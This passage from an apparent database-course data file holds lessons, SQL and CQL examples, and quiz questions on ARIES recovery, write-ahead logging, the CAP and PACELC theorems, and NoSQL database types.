            {q: 'A hash join is most efficient when:', o: ['Both tables are already sorted on the join key', 'The inner table has an index on the join column', 'It is an equi-join, no index exists, and enough memory is available for the hash table', 'The outer table has very few rows'], a: 2},
            {q: 'What is keyset (seek) pagination?', o: ['Using OFFSET to skip rows', 'Using WHERE id > last_seen_id with LIMIT instead of OFFSET', 'Caching all pages in memory', 'Using a cursor to hold the result set open'], a: 1},
            {q: 'Selection pushdown optimization means:', o: ['Pushing SELECT columns to the end of the plan', 'Applying WHERE filters as early as possible to reduce intermediate result sizes', 'Selecting the best index for the query', 'Pushing subqueries into the main query'], a: 1},
            {q: 'In MySQL EXPLAIN output, the access type "eq_ref" indicates:', o: ['A full table scan', 'A range scan using an index', 'At most one matching row read using a primary key or unique index', 'An index-only scan without table access'], a: 2}
          ]
        }
      ]
    },
    {
      id: 'recov', t: 'Recovery',
      topics: [
        {
          t: 'Recovery & Write-Ahead Logging (ARIES)',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Your database server crashes during a nightly batch update that has processed 8 million of 10 million rows. Some committed transactions may not have been flushed to disk, while some uncommitted changes may have been written out. Without proper recovery mechanisms, you face data loss or an inconsistent state. The Write-Ahead Log protocol and ARIES algorithm ensure that upon restart, every committed change is preserved and every uncommitted change is rolled back &mdash; restoring the database to a perfectly consistent state. Recovery is what makes the <b>Atomicity</b> and <b>Durability</b> promises of ACID real, and ARIES-based questions appear frequently in database interviews.</p></div><div class="learn-section"><div class="learn-h">Why Recovery?</div><p class="learn-p"><b>Database recovery</b> ensures that the database can be restored to a consistent state after a failure — whether it\'s a transaction failure, system crash, or disk failure. Recovery is what guarantees <b>Atomicity</b> (undo incomplete transactions) and <b>Durability</b> (committed changes survive crashes) from ACID.</p><p class="learn-p">Types of failures:</p><ul class="learn-list"><li><b>Transaction failure</b> — Logical error (e.g., constraint violation) or deadlock abort</li><li><b>System failure</b> — Power outage, OS crash, DBMS crash (memory contents lost, disk intact)</li><li><b>Disk failure</b> — Storage device failure (requires backups)</li></ul></div><div class="learn-section"><div class="learn-h">Write-Ahead Logging (WAL)</div><p class="learn-p">The <b>Write-Ahead Log (WAL)</b> is the fundamental principle behind database recovery: <b>before any change is written to the database on disk, the corresponding log record must first be written to stable storage (the log).</b></p><p class="learn-p">Log records contain:</p><ul class="learn-list"><li><b>Transaction ID</b> — Which transaction made the change</li><li><b>Data item ID</b> — Which data was changed (page + offset)</li><li><b>Before image (old value)</b> — For UNDO</li><li><b>After image (new value)</b> — For REDO</li><li><b>LSN (Log Sequence Number)</b> — Unique, monotonically increasing identifier</li></ul><div class="learn-code">-- WAL log example:\n-- LSN | TxnID | Operation  | PageID | Before | After\n-- 001 | T1    | BEGIN      | -      | -      | -\n-- 002 | T1    | UPDATE     | P5     | 1000   | 1500\n-- 003 | T2    | BEGIN      | -      | -      | -\n-- 004 | T2    | UPDATE     | P3     | 200    | 350\n-- 005 | T1    | COMMIT     | -      | -      | -\n-- 006 | T2    | UPDATE     | P7     | 50     | 75\n-- CRASH HERE\n-- Recovery: REDO T1 (committed), UNDO T2 (not committed)</div></div><div class="learn-section"><div class="learn-h">Steal / No-Force Policy</div><p class="learn-p">Buffer management policies affect recovery:</p><table class="learn-table"><tr><th>Policy</th><th>Description</th><th>Recovery Need</th></tr><tr><td><b>Steal</b></td><td>Dirty pages can be flushed to disk BEFORE transaction commits</td><td>Need UNDO (uncommitted changes may be on disk)</td></tr><tr><td><b>No-Steal</b></td><td>Dirty pages NOT flushed until commit</td><td>No UNDO needed (uncommitted changes never on disk)</td></tr><tr><td><b>Force</b></td><td>All dirty pages flushed at commit time</td><td>No REDO needed (all committed changes on disk)</td></tr><tr><td><b>No-Force</b></td><td>Dirty pages NOT necessarily flushed at commit</td><td>Need REDO (committed changes may not be on disk)</td></tr></table><p class="learn-p">Most real systems (InnoDB, PostgreSQL) use <b>Steal + No-Force</b> for best performance, which requires both UNDO and REDO — hence the need for the ARIES algorithm.</p></div><div class="learn-section"><div class="learn-h">ARIES Recovery Algorithm</div><p class="learn-p"><b>ARIES</b> (Algorithm for Recovery and Isolation Exploiting Semantics) is the gold standard recovery algorithm used by most modern RDBMS. It has three phases:</p><ol class="learn-list"><li><b>Analysis Phase</b>:<ul class="learn-list"><li>Scan the log from the last <b>checkpoint</b> forward</li><li>Determine which transactions were active at crash time (the <b>Loser set</b>)</li><li>Determine which pages might have uncommitted changes on disk (<b>Dirty Page Table</b>)</li></ul></li><li><b>Redo Phase</b> (repeating history):<ul class="learn-list"><li>Scan forward from the earliest LSN in the dirty page table</li><li>Re-apply ALL logged updates (both committed and uncommitted) to restore the database to its exact pre-crash state</li><li>This ensures durability for committed transactions</li></ul></li><li><b>Undo Phase</b>:<ul class="learn-list"><li>Scan backward from the end of the log</li><li>Undo all changes made by transactions that did not commit (the Loser set)</li><li>Write <b>Compensation Log Records (CLRs)</b> for each undone operation to avoid re-undoing on a subsequent crash</li></ul></li></ol><div class="learn-tip"><b>Tip:</b> Remember the ARIES mantra: <b>"Analysis → Redo → Undo"</b>. ARIES <b>repeats history before undoing</b> — even uncommitted changes are redone first, then undone. This simplifies recovery logic and handles crashes during recovery itself.</div></div><div class="learn-section"><div class="learn-h">Checkpointing</div><p class="learn-p">A <b>checkpoint</b> is a periodic operation that records the current state to reduce recovery time:</p><ul class="learn-list"><li>Flush all dirty pages to disk (or record which are dirty)</li><li>Write a checkpoint record to the log with active transaction list and dirty page table</li><li>Recovery starts from the checkpoint instead of the beginning of the log</li></ul><p class="learn-p">Types of checkpoints:</p><ul class="learn-list"><li><b>Sharp checkpoint</b> — Flush all dirty pages, stop all transactions momentarily. Simple but blocks operations.</li><li><b>Fuzzy checkpoint</b> — Record the dirty page table and active transactions without flushing all pages immediately. Used by ARIES. Does not block operations.</li></ul></div><div class="learn-section"><div class="learn-h">Compensation Log Records (CLRs)</div><p class="learn-p"><b>CLRs</b> are log records generated during the UNDO phase. They record the undo action taken, and they are <b>redo-only</b> (never undone themselves). This ensures that if the system crashes during recovery, the already-undone operations won\'t be undone again.</p><p class="learn-p">Each CLR has an <b>UndoNextLSN</b> pointer that points to the next log record to undo, allowing the system to skip already-undone operations on a re-crash.</p></div><div class="learn-section"><div class="learn-h">Recovery from Disk Failure</div><p class="learn-p">Disk failures require <b>backups</b>:</p><ul class="learn-list"><li><b>Full backup</b> — Complete copy of the database</li><li><b>Incremental backup</b> — Only changes since the last backup</li><li><b>Point-in-time recovery</b> — Restore a backup, then replay the WAL to a specific point in time</li></ul><div class="learn-code">-- MySQL: Point-in-time recovery\n-- 1. Restore the last full backup\n-- 2. Replay binary logs up to the desired point\nmysqlbinlog --stop-datetime="2024-06-15 14:30:00" binlog.000042 | mysql</div></div><div class="learn-section"><div class="learn-h">Shadow Paging</div><p class="learn-p"><b>Shadow paging</b> is an alternative to WAL for ensuring atomicity and durability. The DBMS maintains two page tables: the <b>current page table</b> (used by active transactions) and a <b>shadow page table</b> (the last consistent snapshot). On a write, the system copies the affected page to a new location, updates the current page table, but leaves the shadow table pointing to the old page.</p><div class="learn-code">Shadow Paging:\n1. Shadow page table → original pages (consistent state)\n2. Current page table → modified pages (in-progress)\n3. On COMMIT: replace shadow table pointer with current table\n   (atomic pointer swap = atomic commit!)\n4. On ABORT: discard current table, revert to shadow\n5. Old pages become garbage → need cleanup</div><p class="learn-p"><b>Why WAL replaced shadow paging:</b></p><ul class="learn-list"><li><b>Poor locality:</b> Updated pages scatter across disk (no in-place update).</li><li><b>No concurrent transaction support:</b> Shadow paging tracks one transaction at a time in its basic form.</li><li><b>Garbage collection overhead:</b> Old pages must be reclaimed.</li><li><b>Large page tables:</b> Must copy entire page table for each transaction.</li></ul><p class="learn-p">WAL with steal/no-force is more complex but supports concurrent transactions efficiently and maintains sequential I/O patterns.</p></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What is WAL and why is it fundamental to database recovery?</b><br>A: Write-Ahead Logging requires that every change be recorded in a log on stable storage <b>before</b> the corresponding data page is written to disk. This guarantees that even if the system crashes mid-write, the log contains enough information to either redo committed changes or undo uncommitted ones. Without WAL, a crash could leave the database in an inconsistent state with no way to determine what was or was not written.</p><p class="learn-p"><b>Q2: Describe the three phases of ARIES and the purpose of each.</b><br>A: <b>Analysis</b> scans forward from the last checkpoint to build the dirty page table and identify which transactions were active at crash time (the loser set). <b>Redo</b> replays ALL logged operations (committed and uncommitted) from the earliest LSN in the dirty page table to restore the database to its exact pre-crash state &mdash; this is the "repeat history" principle. <b>Undo</b> scans backward and reverses all operations of uncommitted transactions, writing CLRs for each undone action.</p><p class="learn-p"><b>Q3: What are CLRs and why are they redo-only?</b><br>A: Compensation Log Records are written during the undo phase to record that a particular undo action was performed. They are redo-only (never undone themselves) because if the system crashes during recovery, the already-undone operations should not be undone again. Each CLR contains an UndoNextLSN pointer that tells recovery which log record to undo next, allowing it to skip already-compensated records.</p><p class="learn-p"><b>Q4: Explain the Steal/No-Force buffer management policy and why most systems use it.</b><br>A: <b>Steal</b> allows dirty (uncommitted) pages to be flushed to disk before commit, which frees buffer pool space. <b>No-Force</b> means committed changes are NOT required to be immediately flushed to disk at commit time, reducing I/O. This combination (Steal + No-Force) gives the best performance but requires both UNDO capability (for stolen uncommitted pages) and REDO capability (for committed but unflushed pages) &mdash; which is exactly what ARIES provides.</p><p class="learn-p"><b>Q5: What is the difference between a fuzzy and a sharp checkpoint?</b><br>A: A <b>sharp checkpoint</b> halts all transactions, flushes every dirty page to disk, then resumes &mdash; simple but causes a pause in processing. A <b>fuzzy checkpoint</b> (used by ARIES and most production databases) merely records the dirty page table and active transaction list without flushing all pages. It does not block operations, but recovery must start scanning from an earlier point in the log.</p><p class="learn-p"><b>Q6: How does point-in-time recovery work?</b><br>A: First, restore the most recent full (or incremental) backup to get the database to a known state. Then replay the WAL / binary log records forward in time up to the desired target timestamp or LSN. This allows recovering to any moment, for example just before an accidental <code>DROP TABLE</code>, by stopping the log replay right before that statement.</p></div>',
          code: `-- =============================================
-- Recovery & Write-Ahead Logging (ARIES)
-- =============================================

-- ===== WAL CONCEPT DEMONSTRATION =====

-- InnoDB uses WAL: ib_logfile0, ib_logfile1 (redo logs)

-- Check redo log configuration
SHOW VARIABLES LIKE 'innodb_log_file_size';
SHOW VARIABLES LIKE 'innodb_log_files_in_group';
SHOW VARIABLES LIKE 'innodb_flush_log_at_trx_commit';
-- 1 = flush log to disk at every commit (safest, default)
-- 2 = write to OS buffer at commit, flush every second
-- 0 = write and flush every second (fastest, least safe)

-- ===== TRANSACTION LOG EXAMPLE =====

-- Scenario: T1 transfers money, T2 updates salary, crash happens

-- T1: Transfer $500 from Account 1 to Account 2
START TRANSACTION;  -- Log: [BEGIN T1]
UPDATE Accounts SET balance = balance - 500 WHERE acc_id = 1;
-- Log: [T1, UPDATE, Accounts.acc_id=1, old=10000, new=9500]
UPDATE Accounts SET balance = balance + 500 WHERE acc_id = 2;
-- Log: [T1, UPDATE, Accounts.acc_id=2, old=5000, new=5500]
COMMIT;  -- Log: [COMMIT T1]

-- T2: Update salary (not yet committed when crash happens)
START TRANSACTION;  -- Log: [BEGIN T2]
UPDATE Employees SET salary = 120000 WHERE emp_id = 1;
-- Log: [T2, UPDATE, Employees.emp_id=1, old=100000, new=120000]
-- *** CRASH BEFORE COMMIT ***

-- ARIES Recovery:
-- 1. ANALYSIS: Read from checkpoint.
--    T1 committed (in redo set), T2 active (in undo/loser set).
-- 2. REDO: Replay ALL log records from dirty page table's min LSN.
--    Redo T1's updates (ensure they're on disk).
--    Redo T2's update too (repeat history).
-- 3. UNDO: Undo T2's changes (not committed).
--    Write CLR: [CLR, T2, Employees.emp_id=1, undo to 100000]
--    Log: [ABORT T2]
-- Database is now consistent: T1's changes preserved, T2 rolled back.

-- ===== CHECKPOINT =====

-- InnoDB performs fuzzy checkpointing automatically
-- Force a checkpoint (for understanding):
-- FLUSH TABLES WITH READ LOCK;  -- Sharp checkpoint (blocks writes)
-- UNLOCK TABLES;

-- Check checkpoint info
SHOW ENGINE INNODB STATUS;  -- Look for "Log sequence number" and "Last checkpoint at"

-- ===== BACKUP AND RECOVERY =====

-- Logical backup
-- mysqldump --single-transaction --routines --triggers mydb > backup.sql

-- Physical backup (using Percona XtraBackup or MySQL Enterprise Backup)
-- xtrabackup --backup --target-dir=/backup/full/

-- Point-in-time recovery using binary logs:
-- 1. Restore full backup
-- 2. Apply binary logs:
-- mysqlbinlog --start-position=154 --stop-datetime="2024-06-15 14:30:00" \\
--     /var/lib/mysql/binlog.000042 | mysql -u root

-- ===== UNDO LOG SEGMENTS =====
SHOW VARIABLES LIKE 'innodb_undo_tablespaces';
SHOW VARIABLES LIKE 'innodb_undo_log_truncate';

-- Check undo log usage
SELECT * FROM information_schema.INNODB_TRX;  -- Active transactions
-- Long-running transactions hold undo log segments,
-- preventing purge of old versions (affects MVCC)`,
          problems: [
            ['Write-Ahead Logging', 'https://www.geeksforgeeks.org/log-based-recovery-in-dbms/', 'Medium']
          ],
          mcqs: [
            {q: 'In ARIES, what is the correct order of recovery phases?', o: ['Undo → Redo → Analysis', 'Redo → Undo → Analysis', 'Analysis → Redo → Undo', 'Analysis → Undo → Redo'], a: 2},
            {q: 'The Write-Ahead Log (WAL) rule states:', o: ['Data must be written to disk before the log', 'The log record must be written to stable storage before the corresponding data modification is written to disk', 'The log is written after the transaction commits', 'Logs are not needed if checkpoints are frequent'], a: 1},
            {q: 'Compensation Log Records (CLRs) in ARIES are:', o: ['Undo-only records', 'Redo-only records that are never undone', 'Both redo and undo records', 'Checkpoint records'], a: 1},
            {q: 'Under the Steal/No-Force buffer policy, which recovery operations are needed?', o: ['Only REDO', 'Only UNDO', 'Both REDO and UNDO', 'Neither REDO nor UNDO'], a: 2},
            {q: 'During the ARIES Redo phase, which operations are replayed?', o: ['Only committed transactions', 'Only uncommitted transactions', 'All logged operations (both committed and uncommitted)', 'Only operations after the last checkpoint'], a: 2},
            {q: 'A fuzzy checkpoint differs from a sharp checkpoint because it:', o: ['Flushes all dirty pages to disk immediately', 'Blocks all transactions during the checkpoint', 'Records the dirty page table without flushing all pages, avoiding blocking', 'Does not write any log record'], a: 2},
            {q: 'The UndoNextLSN field in a CLR points to:', o: ['The next log record to redo', 'The next log record of the same transaction to undo', 'The checkpoint record', 'The commit record of the transaction'], a: 1}
          ]
        }
      ]
    },
    {
      id: 'nosql', t: 'NoSQL & CAP Theorem',
      topics: [
        {
          t: 'CAP Theorem',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">You are designing a distributed order management system for a global trading firm. During a network partition between data centers, should the system reject writes to maintain consistency (risking downtime) or continue serving requests with potentially stale data (risking inconsistency)? The CAP theorem formalizes this unavoidable trade-off and is a staple of system design interviews. Understanding CAP &mdash; and its extension PACELC &mdash; lets you make informed architectural decisions when choosing between databases like Cassandra (AP), MongoDB (CP), or ZooKeeper (CP) for different parts of your system.</p></div><div class="learn-section"><div class="learn-h">Brewer\'s CAP Theorem</div><p class="learn-p">The <b>CAP Theorem</b> (Eric Brewer, 2000) states that a distributed data store can provide at most <b>two of three</b> guarantees simultaneously:</p><table class="learn-table"><tr><th>Property</th><th>Meaning</th></tr><tr><td><b>C</b>onsistency</td><td>Every read returns the most recent write (all nodes see the same data at the same time)</td></tr><tr><td><b>A</b>vailability</td><td>Every request receives a non-error response (but not necessarily the most recent data)</td></tr><tr><td><b>P</b>artition Tolerance</td><td>System continues operating despite network partitions between nodes</td></tr></table><p class="learn-p">Since <b>network partitions are inevitable</b> in distributed systems, the real choice is between <b>CP</b> (consistency + partition tolerance) and <b>AP</b> (availability + partition tolerance).</p><div class="learn-code">During a network partition:\n\n  CP System: Refuse requests to maintain consistency\n     → Returns error or timeout rather than stale data\n     → Examples: HBase, MongoDB (with majority read concern), ZooKeeper\n\n  AP System: Continue serving requests with possibly stale data\n     → Returns data that might not be the latest\n     → Examples: Cassandra, DynamoDB, CouchDB\n\n  CA System: Not practical in distributed systems\n     → No partition tolerance = single node = traditional RDBMS</div></div><div class="learn-section"><div class="learn-h">PACELC Theorem</div><p class="learn-p">PACELC extends CAP: <b>if Partition → choose A or C; Else → choose Latency or Consistency</b>. Even when the network is working fine, there\'s a tradeoff between latency and consistency.</p><table class="learn-table"><tr><th>System</th><th>During Partition</th><th>Else (Normal)</th><th>Classification</th></tr><tr><td>Cassandra</td><td>AP</td><td>EL (low latency)</td><td>PA/EL</td></tr><tr><td>MongoDB</td><td>CP</td><td>EC (consistent)</td><td>PC/EC</td></tr><tr><td>DynamoDB</td><td>AP</td><td>EL</td><td>PA/EL</td></tr><tr><td>HBase</td><td>CP</td><td>EC</td><td>PC/EC</td></tr></table></div><div class="learn-section"><div class="learn-h">Consistency Models</div><table class="learn-table"><tr><th>Model</th><th>Guarantee</th><th>Example</th></tr><tr><td>Strong Consistency</td><td>Read always returns latest write</td><td>RDBMS, ZooKeeper</td></tr><tr><td>Eventual Consistency</td><td>All replicas converge eventually</td><td>DNS, Cassandra</td></tr><tr><td>Causal Consistency</td><td>Causally related operations seen in order</td><td>MongoDB (causal sessions)</td></tr><tr><td>Read-your-writes</td><td>Client always sees its own writes</td><td>Session consistency</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Explain the CAP theorem with real database examples.</b><br>A: CAP states a distributed system can guarantee at most two of Consistency, Availability, and Partition Tolerance. Since network partitions are inevitable, the practical choice is CP or AP. <b>CP example:</b> HBase and ZooKeeper refuse requests during a partition to ensure all reads return the latest write. <b>AP example:</b> Cassandra and DynamoDB continue serving reads and writes during a partition, accepting that some nodes may return stale data until the partition heals and replicas converge.</p><p class="learn-p"><b>Q2: Why is a CA system impractical in distributed systems?</b><br>A: A CA system would guarantee both consistency and availability but cannot tolerate network partitions. In a distributed environment, network partitions are a reality &mdash; switches fail, cables get cut, cloud availability zones lose connectivity. A system that ignores partitions is effectively a single-node system (like a traditional RDBMS), which is not truly distributed. The moment you distribute data across nodes, you must handle partitions.</p><p class="learn-p"><b>Q3: What does the PACELC extension add to CAP?</b><br>A: PACELC says: if there is a <b>P</b>artition, choose <b>A</b>vailability or <b>C</b>onsistency; <b>E</b>lse (normal operation), choose <b>L</b>atency or <b>C</b>onsistency. This captures the fact that even when the network is healthy, replicating data synchronously for strong consistency adds latency. Cassandra is PA/EL (available during partitions, low latency normally), while MongoDB is PC/EC (consistent during partitions, consistent normally).</p><p class="learn-p"><b>Q4: How does Cassandra achieve tunable consistency with W + R &gt; N?</b><br>A: Cassandra lets you set consistency levels per query. With a replication factor N=3, writing at QUORUM (W=2) and reading at QUORUM (R=2) gives W+R=4 &gt; 3, guaranteeing at least one replica in the read set has the latest write &mdash; achieving strong consistency. Writing with ONE (W=1) and reading with ONE (R=1) gives W+R=2 &lt; 3 &mdash; eventual consistency but lower latency.</p><p class="learn-p"><b>Q5: Compare the Saga pattern vs 2PC for distributed transactions across microservices.</b><br>A: <b>2PC (Two-Phase Commit)</b> provides strong consistency by coordinating a prepare-then-commit protocol across all participants, but it is blocking &mdash; if the coordinator fails, participants hold locks indefinitely. <b>Saga</b> breaks the transaction into a sequence of local transactions, each with a compensating action for rollback. Sagas are non-blocking and more available, but provide only eventual consistency and require careful design of compensation logic.</p></div>',
          code: `-- CAP Theorem — Decision Framework

-- When designing a distributed system, ask:
-- 1. Can we tolerate stale reads? → AP (availability-first)
-- 2. Must every read be the latest? → CP (consistency-first)

-- Example: Cassandra (AP) tunable consistency
-- Write with quorum: W replicas must acknowledge
-- Read with quorum: R replicas must respond
-- If W + R > N (replication factor), strong consistency achieved

-- Cassandra CQL examples:
CREATE KEYSPACE shop WITH replication = {
  'class': 'NetworkTopologyStrategy',
  'dc1': 3, 'dc2': 3
};

-- Consistency levels:
-- ONE: Write to 1 replica (fast, eventual consistency)
-- QUORUM: Write to majority (balance speed + consistency)
-- ALL: Write to all replicas (slowest, strongest consistency)

-- Read with different consistency:
CONSISTENCY QUORUM;
SELECT * FROM products WHERE id = 123;

-- With N=3 replicas:
-- W=QUORUM(2) + R=QUORUM(2) = 4 > 3 → STRONG consistency
-- W=ONE(1) + R=ONE(1) = 2 < 3 → EVENTUAL consistency`,
          problems: [
            ['CAP Theorem Explained', 'https://www.geeksforgeeks.org/the-cap-theorem-in-dbms/', 'Easy'],
            ['PACELC Theorem', 'https://www.geeksforgeeks.org/pacelc-theorem/', 'Medium'],
            ['Consistency Models', 'https://www.geeksforgeeks.org/eventual-vs-strong-consistency-in-distributed-databases/', 'Medium'],
            ['Distributed Database Concepts', 'https://www.geeksforgeeks.org/distributed-database-system/', 'Hard'],
            ['Two-Phase Commit Protocol', 'https://www.geeksforgeeks.org/two-phase-commit-protocol-distributed-transaction-management/', 'Medium']
          ],
          mcqs: [
            {q: 'According to CAP theorem, during a network partition, a distributed system must choose between:', o: ['Consistency and Availability', 'Latency and Throughput', 'Consistency and Partition Tolerance', 'Availability and Latency'], a: 0},
            {q: 'Cassandra is classified as which type of CAP system?', o: ['CA', 'CP', 'AP', 'CAP'], a: 2},
            {q: 'In eventual consistency, if no new updates are made, all replicas will:', o: ['Immediately synchronize', 'Eventually converge to the same value', 'Remain inconsistent forever', 'Delete stale data'], a: 1},
            {q: 'PACELC extends CAP by addressing which additional trade-off during normal operation?', o: ['Throughput vs Memory', 'Latency vs Consistency', 'Storage vs Computation', 'Bandwidth vs CPU'], a: 1},
            {q: 'In Cassandra with N=3, which consistency level combination guarantees strong consistency?', o: ['W=ONE, R=ONE', 'W=ONE, R=QUORUM', 'W=QUORUM, R=QUORUM', 'W=QUORUM, R=ONE'], a: 2},
            {q: 'ZooKeeper is classified as which type under CAP?', o: ['AP', 'CA', 'CP', 'PA/EL'], a: 2}
          ]
        },
        {
          t: 'NoSQL Database Types',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Your market data pipeline ingests 500,000 tick events per second with varying schemas. A traditional RDBMS cannot handle this write throughput or schema flexibility. Understanding the four NoSQL categories &mdash; key-value, document, column-family, and graph &mdash; lets you choose the right tool for each use case, whether it is session caching (Redis), content management (MongoDB), time-series analytics (Cassandra), or social graph traversal (Neo4j). In system design interviews, you will be expected to justify your database choice based on access patterns, consistency requirements, and scale.</p></div><div class="learn-section"><div class="learn-h">Why NoSQL?</div><p class="learn-p">NoSQL databases emerged to handle: <b>massive scale</b> (petabytes), <b>flexible schemas</b> (schema-on-read), <b>high write throughput</b>, and <b>horizontal scaling</b>. They sacrifice some RDBMS features (joins, ACID) for scalability and performance.</p></div><div class="learn-section"><div class="learn-h">4 Types of NoSQL Databases</div><table class="learn-table"><tr><th>Type</th><th>Data Model</th><th>Examples</th><th>Best For</th></tr><tr><td><b>Key-Value</b></td><td>Simple key → value pairs</td><td>Redis, DynamoDB, Memcached</td><td>Caching, sessions, simple lookups</td></tr><tr><td><b>Document</b></td><td>Key → JSON/BSON document</td><td>MongoDB, CouchDB, Firestore</td><td>Content management, catalogs, user profiles</td></tr><tr><td><b>Column-Family</b></td><td>Row key → column families</td><td>Cassandra, HBase, ScyllaDB</td><td>Time-series, IoT, analytics at scale</td></tr><tr><td><b>Graph</b></td><td>Nodes + edges + properties</td><td>Neo4j, Amazon Neptune, ArangoDB</td><td>Social networks, recommendations, fraud detection</td></tr></table></div><div class="learn-section"><div class="learn-h">Key-Value Stores (Redis)</div><p class="learn-p">Simplest NoSQL model. Every item is a <b>key-value pair</b>. No schema, no relationships. Extremely fast O(1) lookups. Redis adds data structures (strings, lists, sets, sorted sets, hashes, streams).</p><div class="learn-code">Redis Commands:\nSET user:1001 \'{"name":"Alice","age":30}\'    -- String\nGET user:1001                                  -- O(1) lookup\n\nHSET user:1001 name Alice age 30              -- Hash\nHGET user:1001 name                           -- Get field\n\nLPUSH queue:jobs "job1" "job2"                -- List (queue)\nRPOP queue:jobs                                -- Dequeue\n\nSADD tags:post1 "python" "redis" "nosql"      -- Set\nSMEMBERS tags:post1                            -- All members\n\nZADD leaderboard 100 "Alice" 85 "Bob"         -- Sorted set\nZRANGE leaderboard 0 -1 WITHSCORES            -- Ranked</div></div><div class="learn-section"><div class="learn-h">Document Stores (MongoDB)</div><p class="learn-p">Store data as <b>JSON-like documents</b> (BSON in MongoDB). Documents can have nested objects and arrays — no need to normalize into multiple tables. Schema-flexible: each document in a collection can have different fields.</p><div class="learn-code">// MongoDB document\n{\n  _id: ObjectId("507f1f77bcf86cd799439011"),\n  name: "Alice",\n  age: 30,\n  address: { city: "NYC", zip: "10001" },   // Embedded document\n  orders: [                                   // Array of subdocs\n    { product: "Laptop", price: 999 },\n    { product: "Mouse", price: 25 }\n  ]\n}\n\n// No JOIN needed — data is denormalized into one document\n// Trade-off: data duplication vs. read performance</div></div><div class="learn-section"><div class="learn-h">Column-Family Stores (Cassandra)</div><p class="learn-p">Data organized by <b>column families</b> (similar to tables but columns can vary per row). Optimized for <b>write-heavy</b> workloads and <b>time-series data</b>. Uses a partition key for distribution across nodes.</p><div class="learn-code">Cassandra Data Model:\n\nCREATE TABLE sensor_data (\n  sensor_id UUID,\n  timestamp TIMESTAMP,\n  temperature FLOAT,\n  humidity FLOAT,\n  PRIMARY KEY (sensor_id, timestamp)\n) WITH CLUSTERING ORDER BY (timestamp DESC);\n\n-- sensor_id = partition key (determines which node)\n-- timestamp = clustering key (sorts within partition)\n-- Reads within a partition are sequential → fast!</div></div><div class="learn-section"><div class="learn-h">Graph Databases (Neo4j)</div><p class="learn-p">Model data as <b>nodes</b> (entities), <b>edges</b> (relationships), and <b>properties</b>. Relationships are first-class citizens — stored explicitly, not computed via JOINs. Traversals are O(1) per hop regardless of total data size.</p><div class="learn-code">-- Cypher query language (Neo4j)\nCREATE (alice:Person {name: "Alice"})\nCREATE (bob:Person {name: "Bob"})\nCREATE (alice)-[:FRIENDS_WITH {since: 2020}]->(bob)\n\n-- Find friends of friends (2-hop traversal)\nMATCH (p:Person {name: "Alice"})-[:FRIENDS_WITH*2]->(fof)\nRETURN fof.name\n\n-- This would require multiple self-JOINs in SQL!</div></div><div class="learn-section"><div class="learn-h">SQL vs NoSQL — When to Choose What</div><table class="learn-table"><tr><th>Factor</th><th>SQL (RDBMS)</th><th>NoSQL</th></tr><tr><td>Schema</td><td>Fixed, predefined</td><td>Flexible, schema-on-read</td></tr><tr><td>Scaling</td><td>Vertical (scale up)</td><td>Horizontal (scale out)</td></tr><tr><td>Transactions</td><td>Full ACID</td><td>BASE (basic availability, soft state, eventual consistency)</td></tr><tr><td>Joins</td><td>Native support</td><td>Generally not supported</td></tr><tr><td>Best for</td><td>Complex queries, relationships, ACID needs</td><td>Big data, real-time, flexible schema</td></tr></table><div class="learn-warn"><b>Important:</b> NoSQL doesn\'t mean "never SQL." Modern systems often use <b>polyglot persistence</b> — SQL for transactional data, Redis for caching, MongoDB for content, Elasticsearch for search.</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: When would you choose MongoDB over PostgreSQL?</b><br>A: MongoDB excels when your data has a <b>variable or evolving schema</b> (e.g., product catalogs where each category has different attributes), when you need to store <b>deeply nested documents</b> that would require many JOINs in an RDBMS, and when your read patterns align with document boundaries. PostgreSQL is better when you need complex multi-table JOINs, full ACID transactions across multiple entities, or advanced SQL features like window functions and CTEs.</p><p class="learn-p"><b>Q2: What are the main Redis data structures and their use cases?</b><br>A: <b>Strings</b> for caching and counters (SET/GET/INCR). <b>Hashes</b> for object storage (HSET/HGET &mdash; like a mini document). <b>Lists</b> for message queues (LPUSH/RPOP). <b>Sets</b> for tags, unique visitors, intersections (SADD/SMEMBERS/SINTER). <b>Sorted Sets</b> for leaderboards and priority queues (ZADD/ZRANGE). <b>Streams</b> for event sourcing and log processing. Redis also supports pub/sub, Lua scripting, and transactions via MULTI/EXEC.</p><p class="learn-p"><b>Q3: How does Cassandra partition key design affect query performance?</b><br>A: The partition key determines which node stores the data via consistent hashing. All rows with the same partition key are stored together on the same node, making queries within a partition extremely fast (sequential disk reads). A poorly chosen partition key can create <b>hot spots</b> (all data on one node) or require expensive <b>scatter-gather queries</b> across all nodes. The rule of thumb: design your partition key so that each query hits exactly one partition.</p><p class="learn-p"><b>Q4: What advantage do graph databases have over RDBMS for relationship-heavy queries?</b><br>A: In an RDBMS, traversing relationships requires JOINs, and the cost grows with the size of the tables being joined. In a graph database like Neo4j, relationships are stored as direct pointers between nodes, making each traversal hop <b>O(1)</b> regardless of the total dataset size. A "friends of friends of friends" query that would require 3 self-JOINs in SQL (potentially scanning millions of rows) is a simple 3-hop traversal in a graph DB.</p><p class="learn-p"><b>Q5: Explain embedding vs referencing in MongoDB document design.</b><br>A: <b>Embed</b> when: the relationship is 1:1 or 1:few, the sub-data is always read with the parent, and you need atomic updates on the whole document. <b>Reference</b> (store an ID and look up separately) when: the relationship is 1:many with unbounded growth (e.g., comments on a post), the related data is updated independently, or you have many-to-many relationships. Embedding gives faster reads (single query) but can cause document bloat; referencing requires multiple queries but keeps documents lean.</p><p class="learn-p"><b>Q6: What does BASE mean and how does it contrast with ACID?</b><br>A: BASE stands for <b>Basically Available</b> (the system guarantees some level of availability even during failures), <b>Soft state</b> (the system state may change over time even without new input, due to eventual consistency), and <b>Eventually consistent</b> (given enough time without new writes, all replicas will converge). ACID prioritizes correctness and strong consistency; BASE prioritizes availability and partition tolerance, accepting temporary inconsistency as a trade-off.</p></div>',
          code: `// === NoSQL Database Comparison & Usage Patterns ===

// ===== 1. KEY-VALUE: Redis (using pseudo C++ client) =====
// Best for: caching, session store, rate limiting, leaderboards
/*
  redis_client.SET("session:abc123", "{user_id: 1001}", "EX", 3600);
  string session = redis_client.GET("session:abc123");

  // Rate limiting with sliding window
